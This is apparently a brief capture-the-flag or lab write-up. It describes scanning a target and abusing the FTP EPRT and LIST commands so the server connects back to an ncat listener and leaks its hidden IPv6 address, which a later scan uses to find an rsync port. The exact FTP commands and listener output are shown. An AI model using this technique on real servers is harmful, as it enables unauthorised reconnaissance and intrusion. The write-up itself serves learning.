The result of the standard nmap scan tell us that we have only 3 ports opened: FTP, SSH and HTTP.
Poking around with the web server we start the enumeration, to find possible breach through the machine.
Enumerating the web app we discover a page that gives us some credentials and we can also read something strange, they implemented ipv6.
Then after reading the RFC standards with ipv6 and FTP we discovered that we can leak the ipv6 of the machine using the FTP, using also the credentials gave us before.
So we can set up a ncat listener on our machine, and making an ipv6 connection from the FTP server to leak the ipv6 of the victim machine using the ftp commands EPRT and LIST

EPRT |2|dead:beef:2:112f|5282|
LIST

and we got a callback and the ipv6 was successfully leaked

Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5282
Ncat: Listening on 0.0.0.0:5282
Ncat: Connection from dead:beef::250:56ff:feb9:b819.
Ncat: Connection from dead:beef::250:56ff:feb9:b819:56492.

Running a new full nmap scan with the ipv6, we discover a new port opened 8730 that seemed running rsync
